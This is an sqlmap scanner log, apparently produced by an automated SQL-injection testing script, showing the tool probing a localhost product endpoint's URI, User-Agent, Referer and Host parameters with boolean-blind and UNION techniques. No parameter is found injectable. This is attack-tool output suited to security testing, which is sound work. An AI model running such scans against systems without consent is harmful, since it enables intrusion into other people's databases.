2025-09-26 19:00:02,714 - INFO - [19:00:02] [INFO] testing if parameter 'Host' is dynamic
2025-09-26 19:00:02,714 - INFO - [19:00:02] [WARNING] parameter 'Host' does not appear to be dynamic
2025-09-26 19:00:02,735 - INFO - [19:00:02] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
2025-09-26 19:00:02,735 - INFO - [19:00:02] [INFO] testing for SQL injection on parameter 'Host'
2025-09-26 19:00:02,811 - INFO - [19:00:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:00:03,206 - INFO - [19:00:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:00:03,833 - INFO - [19:00:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:00:04,211 - INFO - [19:00:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:00:04,513 - INFO - [19:00:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:00:04,942 - INFO - [19:00:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:00:05,022 - INFO - [19:00:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:00:05,150 - INFO - [19:00:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:00:05,252 - INFO - [19:00:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:00:05,424 - INFO - [19:00:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:00:05,701 - INFO - [19:00:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 19:00:05,885 - INFO - [19:00:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:00:06,086 - INFO - [19:00:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:00:06,374 - INFO - [19:00:06] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 19:00:06,730 - INFO - [19:00:06] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:00:07,081 - INFO - [19:00:07] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:00:07,607 - INFO - [19:00:07] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:00:07,910 - INFO - [19:00:07] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:00:08,373 - INFO - [19:00:08] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:00:08,673 - INFO - [19:00:08] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:00:09,230 - INFO - [19:00:09] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:00:09,550 - INFO - [19:00:09] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:00:10,070 - INFO - [19:00:10] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:00:10,422 - INFO - [19:00:10] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:00:11,032 - INFO - [19:00:11] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 19:00:11,417 - INFO - [19:00:11] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 19:00:12,057 - INFO - [19:00:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:00:12,075 - INFO - [19:00:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 19:00:12,089 - INFO - [19:00:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 19:00:12,102 - INFO - [19:00:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 19:00:12,115 - INFO - [19:00:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 19:00:12,127 - INFO - [19:00:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 19:00:12,143 - INFO - [19:00:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 19:00:12,158 - INFO - [19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 19:00:12,168 - INFO - [19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 19:00:12,187 - INFO - [19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 19:00:12,195 - INFO - [19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 19:00:12,213 - INFO - [19:00:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 19:00:12,226 - INFO - [19:00:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 19:00:12,242 - INFO - [19:00:12] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 19:00:12,257 - INFO - [19:00:12] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 19:00:12,278 - INFO - [19:00:12] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 19:00:12,292 - INFO - [19:00:12] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 19:00:12,298 - INFO - [19:00:12] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 19:00:12,309 - INFO - [19:00:12] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 19:00:12,334 - INFO - [19:00:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 19:00:12,337 - INFO - [19:00:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 19:00:12,363 - INFO - [19:00:12] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 19:00:12,375 - INFO - [19:00:12] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 19:00:12,390 - INFO - [19:00:12] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 19:00:12,422 - INFO - [19:00:12] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 19:00:12,451 - INFO - [19:00:12] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 19:00:12,456 - INFO - [19:00:12] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 19:00:12,459 - INFO - [19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 19:00:12,486 - INFO - [19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 19:00:12,506 - INFO - [19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 19:00:12,554 - INFO - [19:00:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 19:00:12,577 - INFO - [19:00:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 19:00:12,595 - INFO - [19:00:12] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 19:00:12,617 - INFO - [19:00:12] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 19:00:12,640 - INFO - [19:00:12] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 19:00:12,673 - INFO - [19:00:12] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 19:00:12,693 - INFO - [19:00:12] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 19:00:12,708 - INFO - [19:00:12] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 19:00:12,721 - INFO - [19:00:12] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 19:00:12,757 - INFO - [19:00:12] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 19:00:12,784 - INFO - [19:00:12] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 19:00:13,105 - INFO - [19:00:13] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 19:00:13,324 - INFO - [19:00:13] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 19:00:13,334 - INFO - [19:00:13] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 19:00:13,612 - INFO - [19:00:13] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 19:00:13,885 - INFO - [19:00:13] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 19:00:14,109 - INFO - [19:00:14] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 19:00:14,308 - INFO - [19:00:14] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 19:00:14,535 - INFO - [19:00:14] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 19:00:14,754 - INFO - [19:00:14] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 19:00:14,991 - INFO - [19:00:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:00:15,646 - INFO - [19:00:15] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:00:16,265 - INFO - [19:00:16] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:00:16,766 - INFO - [19:00:16] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 19:00:17,300 - INFO - [19:00:17] [WARNING] parameter 'Host' does not seem to be injectable
2025-09-26 19:00:17,300 - INFO - [19:00:17] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 19:00:17,300 - INFO - [19:00:17] [WARNING] HTTP error codes detected during run:
2025-09-26 19:00:17,300 - INFO - 500 (Internal Server Error) - 7433 times, 404 (Not Found) - 219 times
2025-09-26 19:00:17,306 - INFO - 
2025-09-26 19:00:17,306 - INFO - [*] ending @ 19:00:17 /2025-09-26/
2025-09-26 19:00:17,307 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/products/test --output-dir 'attack-logs-dynamic\Get_a_specific_product_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:59:04 /2025-09-26/

[18:59:06] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_a_specific_product_sqlmap' as the output directory
[18:59:06] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[18:59:06] [INFO] testing connection to the target URL
[18:59:06] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[18:59:06] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:59:06] [INFO] testing if the target URL content is stable
[18:59:07] [INFO] target URL content is stable
[18:59:07] [INFO] testing if URI parameter '#1*' is dynamic
[18:59:07] [INFO] URI parameter '#1*' appears to be dynamic
[18:59:07] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:59:07] [INFO] testing for SQL injection on URI parameter '#1*'
[18:59:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:59:07] [WARNING] reflective value(s) found and filtering out
[18:59:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:59:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:59:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:59:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:59:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:59:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:59:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:59:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:59:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:59:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:59:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:59:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:59:15] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:59:16] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:59:16] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:59:17] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:59:18] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:59:19] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:59:20] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:59:21] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:59:22] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:59:22] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:59:23] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:59:24] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:59:25] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:59:26] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:59:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:59:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:59:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:59:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:59:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:59:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:59:26] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:59:26] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:59:26] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:59:26] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:59:26] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:59:26] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:59:26] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:59:26] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:59:26] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:59:26] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:59:26] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:59:26] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:59:26] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:26] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:59:26] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:59:26] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:59:26] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:26] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:27] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:27] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:27] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:27] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:27] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:59:27] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:59:27] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:59:27] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:59:28] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:59:28] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:59:28] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:59:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:59:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:59:30] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:59:31] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:59:31] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:59:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:59:32] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:59:32] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:59:33] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:59:33] [WARNING] URI parameter '#1*' does not seem to be injectable
other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
[18:59:33] [INFO] testing if parameter 'User-Agent' is dynamic
[18:59:33] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[18:59:33] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[18:59:33] [INFO] testing for SQL injection on parameter 'User-Agent'
[18:59:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:59:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:59:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:59:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:59:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:59:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:59:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:59:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:59:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:59:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:59:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:59:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:59:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:59:37] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:59:37] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:59:37] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:59:38] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:59:38] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:59:39] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:59:39] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:59:40] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:59:40] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:59:41] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:59:41] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:59:41] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:59:42] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:59:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:59:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:59:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:59:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:59:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:59:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:59:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:59:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:59:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:59:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:59:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:59:42] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:59:42] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:59:42] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:59:42] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:59:42] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:59:42] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:59:42] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:59:42] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:59:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:59:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:59:42] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:59:42] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:59:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:59:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:59:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:59:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:59:43] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:43] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:43] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:43] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:43] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:43] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:43] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:59:43] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:59:43] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:59:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:59:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:59:43] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:59:44] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:59:44] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:59:44] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:59:44] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:59:45] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:59:45] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[18:59:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:59:46] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:59:46] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:59:47] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:59:47] [WARNING] parameter 'User-Agent' does not seem to be injectable
[18:59:47] [INFO] testing if parameter 'Referer' is dynamic
[18:59:47] [WARNING] parameter 'Referer' does not appear to be dynamic
[18:59:47] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[18:59:47] [INFO] testing for SQL injection on parameter 'Referer'
[18:59:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:59:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
